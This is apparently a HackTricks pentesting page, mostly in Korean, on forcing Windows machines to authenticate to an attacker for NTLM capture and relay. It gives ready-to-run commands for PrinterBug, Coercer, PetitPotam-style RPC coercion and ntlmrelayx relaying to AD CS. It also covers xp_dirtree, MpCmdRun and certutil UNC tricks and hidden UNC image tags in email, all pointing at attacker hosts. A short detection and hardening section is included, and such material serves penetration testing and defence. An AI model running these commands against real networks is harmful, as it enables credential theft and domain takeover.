# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)는 서드파티 dependencies를 피하기 위해 MIDL compiler를 사용해 C#으로 작성된 **remote authentication triggers**의 **collection**입니다.

## Spooler Service Abuse

_**Print Spooler**_ service가 **enabled**되어 있다면, 이미 알고 있는 AD credentials를 사용해 Domain Controller의 print server에 새 print jobs에 대한 **update**를 **request**하고, 알림을 특정 **system**으로 **send**하도록 지시할 수 있습니다.\
printer가 알림을 임의의 system으로 전송할 때는 해당 **system**에 **authenticate against**해야 합니다. 따라서 attacker는 _**Print Spooler**_ service가 임의의 system에 대해 authenticate하도록 만들 수 있으며, 이 authentication에서는 service가 **computer account**를 **use**합니다.

내부적으로 classic **PrinterBug** primitive은 **`\\PIPE\\spoolss`**를 통한 **`RpcRemoteFindFirstPrinterChangeNotificationEx`**를 악용합니다. attacker는 먼저 printer/server handle을 열고 `pszLocalMachine`에 가짜 client name을 제공하여 target spooler가 **attacker-controlled host로 돌아가는** notification channel을 생성하도록 합니다. 이것이 그 효과가 direct code execution이 아니라 **outbound authentication coercion**인 이유입니다.<sup>[[2]](#references)</sup>\
spooler 자체의 **RCE/LPE**를 찾고 있다면 [PrintNightmare](printnightmare.md)를 확인하세요. 이 페이지는 **coercion 및 relay**에 초점을 맞춥니다.

### Domain에서 Windows Servers 찾기

PowerShell을 사용해 Windows hosts를 나열합니다. Servers는 일반적으로 우선순위가 가장 높은 targets이므로 먼저 여기에 집중하세요:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler 서비스가 수신 대기 중인지 확인

약간 수정한 @mysmartlogin(Vincent Le Toux)의 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 사용하여 Spooler Service가 수신 대기 중인지 확인합니다:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux에서 `rpcdump.py`를 사용해 **MS-RPRN** protocol을 찾을 수도 있습니다:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
또는 Linux에서 **NetExec/CrackMapExec**을 사용하여 호스트를 빠르게 테스트합니다:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
spooler endpoint가 존재하는지만 확인하는 대신 **coercion surfaces**를 **enumerate**하려면 **Coercer scan mode**를 사용하세요:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
이는 EPM에서 endpoint를 확인하는 것만으로는 print RPC interface가 등록되어 있다는 사실만 알 수 있기 때문에 유용합니다. 현재 권한으로 모든 coercion method에 접근할 수 있거나, 해당 호스트가 사용할 수 있는 authentication flow를 생성한다는 보장은 **없습니다**.

### 임의의 호스트에 대해 service가 authenticate하도록 요청

여기에서 [SpoolSample을 compile](https://github.com/NotMedic/NetNTLMtoSilverTicket)할 수 있습니다.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
또는 Linux를 사용 중이라면 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 또는 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)를 사용하세요.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer**를 사용하면 스풀러 인터페이스를 직접 대상으로 삼아 어떤 RPC 메서드가 노출되어 있는지 추측할 필요가 없습니다:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### 최신 RPC-over-TCP 콜백

성공한 `RpcRemoteFindFirstPrinterChangeNotificationEx` 호출이 반드시 TCP/445에서 트래픽을 생성한다고 가정하지 마세요. **Windows 11 22H2 이상에서는 기본적으로 인쇄 통신에 RPC over TCP를 사용합니다**. 정책 또는 `RpcUseNamedPipeProtocol=1` 설정으로 복원하지 않는 한 named pipe를 통한 RPC는 비활성화됩니다. 따라서 기존 SMB 전용 리스너는 트리거가 전송되었다고 보고하면서도 콜백을 전혀 수신하지 못할 수 있습니다. Microsoft는 일반적인 print RPC에 TCP/135(Endpoint Mapper)와 동적 RPC 포트를 사용한다고 문서화하고 있으며, 조직은 이 포트 범위를 제한하거나 고정된 print RPC 포트를 선택할 수 있습니다.<sup>[[10]](#references)</sup>

현재 **Impacket `ntlmrelayx.py`**에는 RPC relay 서버와 소형 Endpoint Mapper가 포함되어 있으며, TCP/135에서 기본적으로 활성화됩니다. 이 지원은 인증된 RPC 콜백을 relay할 수 있도록 2025년 6월에 특히 입증된 PrinterBug-to-AD-CS chain과 함께 병합되었으며, victim이 SMB/WebDAV로 fallback하지 않는 경우에도 동작합니다.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
`Setting up RPC Server on port 135` 및 `RPCD: Received connection`을 relay 출력에서 확인하세요. RPC call이 예상된 error를 반환하지만 listener에 아무것도 도달하지 않는다면, victim의 print RPC transport policy, outbound filtering, DNS resolution, 그리고 다른 process가 이미 TCP/135를 사용하고 있는지 확인하세요. 또한 `ntlmrelayx`가 `--no-rpc-server`와 함께 시작되지 않았는지도 확인하세요.

### WebClient로 SMB 대신 HTTP 강제

여전히 **RPC over named pipes**를 사용하는 system(legacy builds 또는 policy-restored behavior)에서는 일반적인 PrinterBug가 보통 `\\attacker\share`에 대한 **SMB** authentication을 유도하며, 이는 여전히 **capture**, **HTTP targets로 relay** 또는 **SMB signing이 없는 경우 relay**에 유용합니다.\
그러나 **SMB에서 SMB로** relay하는 것은 **SMB signing**에 의해 차단되는 경우가 많으므로, operator는 대신 **HTTP/WebDAV** authentication을 강제하는 것을 선호할 수 있습니다. 이는 위에서 설명한 RPC-over-TCP 동작에 대한 fallback이 아닙니다.

target에서 **WebClient** service가 실행 중이라면, Windows가 **WebDAV over HTTP**를 사용하도록 만드는 형식으로 listener를 지정할 수 있습니다:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
이는 **`ntlmrelayx --adcs`** 또는 다른 HTTP relay target과 chaining할 때 특히 유용합니다. 강제된 연결에서 SMB relayability에 의존하지 않아도 되기 때문입니다. 중요한 주의 사항은 HTTP/WebDAV variant가 작동하려면 victim에서 **WebClient가 실행 중이어야 한다는 것**입니다.

### Unconstrained Delegation과 결합

공격자가 [Unconstrained Delegation](unconstrained-delegation.md)으로 구성된 computer를 compromise한 경우, **printer가 해당 computer로 authenticate하도록 강제할 수 있습니다**. 그러면 printer computer account의 **TGT**가 unconstrained-delegation host의 memory에 cache되며, 공격자는 이를 [Pass the Ticket](pass-the-ticket.md)과 함께 retrieve하고 reuse할 수 있습니다.

### Detection 및 hardening 참고 사항

인쇄하지 않는 DC, PAW 또는 server에서 PrinterBug를 제거하는 가장 reliable한 방법은 Spooler를 stop하고 disable하는 것입니다. 인쇄가 필요한 경우, callback path에서 TCP/445를 block하는 것만으로 충분하다고 가정하지 말고 가능한 모든 relay destination을 harden해야 합니다(SMB server signing, LDAP signing/channel binding, 그리고 AD CS와 같은 HTTP service에서의 EPA).<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Detection은 인증된 MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` 호출, 특히 비로컬 callback 값이 포함된 opnum 62/65 호출과 spooler host에서 발생하는 즉각적인 outbound SMB, HTTP 또는 RPC connection을 연관 지어야 합니다. 현재 print stack은 RPC-over-TCP에 callback을 배치할 수 있으므로, `\PIPE\spoolss`에 대한 access만이 아니라 **interface UUID/opnum 및 source/destination pair**를 baseline으로 설정해야 합니다.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (outbound auth를 trigger하는 interface/opnum)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 동일한 spooler pipe의 asynchronous print interface이며, 특정 host에서 접근 가능한 method를 열거하려면 Coercer를 사용합니다.<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (또한 \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon을 통해서도 사용 가능)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

참고: 이러한 method는 UNC path(예: `\\attacker\share`)를 전달할 수 있는 parameter를 허용합니다. 처리될 때 Windows는 해당 UNC에 machine/user context로 authenticate하므로 NetNTLM capture 또는 relay가 가능합니다.\
spooler abuse의 경우, protocol specification에 server가 `pszLocalMachine`으로 지정된 client로 돌아가는 notification channel을 생성한다고 명시되어 있으므로 **MS-RPRN opnum 65**가 여전히 가장 일반적이고 문서화가 잘 된 primitive입니다.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: \\PIPE\\even을 통한 MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target가 제공된 backup log path를 열려고 시도하고 attacker-controlled UNC에 authenticate합니다.<sup>[[1]](#references)</sup>
- Practical use: Tier 0 asset(DC/RODC/Citrix/etc.)이 NetNTLM을 emit하도록 coerce한 다음, 이를 AD CS endpoint(ESC8/ESC11 scenario) 또는 기타 privileged service로 relay합니다.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack은 **Exchange Server `PushSubscription` feature**에서 발견된 flaw의 결과입니다. 이 feature를 사용하면 mailbox가 있는 모든 domain user가 Exchange server를 강제로 client가 제공한 host에 HTTP로 authenticate하도록 만들 수 있습니다.

기본적으로 **Exchange service는 SYSTEM으로 실행**되며 과도한 privilege가 부여됩니다(구체적으로 **2019 Cumulative Update 이전 domain에 대한 `WriteDacl privileges`**). 이 flaw를 exploit하면 LDAP로 정보를 **relaying**한 후 domain NTDS database를 extract할 수 있습니다. LDAP로 relay할 수 없는 경우에도 이 flaw를 사용해 domain 내 다른 host로 relay하고 authenticate할 수 있습니다. 이 attack을 성공적으로 exploit하면 인증된 domain user account만으로 즉시 Domain Admin access를 얻을 수 있습니다.

## Windows 내부

이미 Windows machine 내부에 있다면 다음을 사용해 privileged account로 Windows가 server에 connection하도록 강제할 수 있습니다.

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
또는 다음과 같은 다른 technique을 사용할 수 있습니다: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin(Microsoft에서 서명한 binary)을 사용하여 NTLM authentication을 강제할 수 있습니다:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### 이메일을 통한 방법

침해하려는 머신에 로그인하는 사용자의 **email address**를 알고 있다면, 다음과 같이 **1x1 image**가 포함된 **email**을 보내면 됩니다.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
피해자가 이를 열면 Windows가 인증을 시도합니다.

### MitM

MitM 공격을 수행하고 피해자가 보는 페이지에 HTML을 삽입할 수 있다면, 다음과 같은 이미지를 삽입해 보세요:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication을 강제하고 phishing하는 다른 방법


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 크래킹

[NTLMv1 challenge를 캡처할 수 있다면, 이를 crack하는 방법을 여기에서 확인하세요](../ntlm/index.html#ntlmv1-attack).\
_NTLMv1을 crack하려면 Responder challenge를 "1122334455667788"로 설정해야 한다는 점을 기억하세요._

## References

- [1] [Unit 42 – Authentication Coercion은 계속 진화하고 있다](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11의 print용 RPC connection updates](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx용 RPC relay server 및 Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
